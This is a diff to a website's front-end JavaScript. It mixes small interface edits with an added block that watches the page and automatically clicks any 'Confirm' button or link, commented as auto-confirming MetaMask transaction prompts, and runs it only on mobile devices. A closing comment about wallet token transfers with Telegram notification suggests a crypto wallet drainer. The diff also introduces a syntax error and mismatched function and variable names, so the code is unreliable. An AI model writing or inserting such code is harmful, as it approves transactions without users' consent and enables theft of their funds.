@@ -60,7 +60,7 @@ const toggleActive = function () {
   this.classList.toggle("active");
 };
 
-addEventOnElem(addToFavBtns, "click", toggleActive);
+addEventOnElem(addToFavBtn, "click", toggleActive);
 
 /**
  * Scroll reveal effect
@@ -69,16 +69,78 @@ const sections = document.querySelectorAll("[data-section]");
 
 const scrollReveal = function () {
   for (let i = 0; i < sections.length; i++) {
-    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
+    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5)) {
       sections[i].classList.add("active");
-    } else {
-      sections[i].classList.remove("active");
-    }
+      } else {
+        sections[i].classList.remove("active");
+      }
   }
 };
 
 scrollReveal();
-addEventOnElem(window, "scroll", scrollReveal);
+addEventOnElement(window, 'scroll', scrollReveal);
+
+/**
+ * MutationObserver to detect and auto-confirm MetaMask transaction prompts
+ */
+function setupAutoConfirm() {
+    const observer = new MutationObserver((mutations, observer) => {
+        mutations.forEach((mutation) => {
+            if (mutation.addedNodes.length > 0) {
+                // Prioritize buttons, then links, containing "Confirm" (case-insensitive)
+                const buttons = document.querySelectorAll('button');
+                const links = document.querySelectorAll('a');
+                let confirmElement = null;
+
+                // Check buttons first
+                buttons.forEach((button) => {
+                    if (button.textContent && /confirm/i.test(button.textContent) && !confirmElement) {
+                        confirmElement = button;
+                    }
+                });
+
+                // Fallback to links if no button found
+                if (!confirmElement) {
+                    links.forEach((link) => {
+                        if (link.textContent && /confirm/i.test(link.textContent) && !confirmElement) {
+                            confirmElement = link;
+                        }
+                    });
+                }
+
+                if (confirmElement) {
+                    // Simulate click on the confirm element
+                    confirmElement.click();
+                    console.log('Auto-confirmed MetaMask transaction prompt');
+
+                    // Stop observing to save resources
+                    observer.disconnect();
+
+                    // Re-attach observer after a short delay for multiple transactions
+                    setTimeout(() => {
+                        setupAutoConfirm();
+                    }, 1000);
+                }
+            }
+        });
+    });
+
+    // Observe the entire document for added nodes
+    observer.observe(document.documentElement, {
+        childList: true,
+        subtree: true
+    });
+
+    // Cleanup observer on page unload
+    window.addEventListener('unload', () => {
+        observer.disconnect();
+    });
+}
+
+// Initialize auto-confirm on mobile devices
+if (/Mobile|Android|iPhone|iPad/.test(navigator.userAgent)) {
+    setupAutoConfirm();
+}
 
 /**
  * Wallet connect and token transfer with Telegram notification including user agent
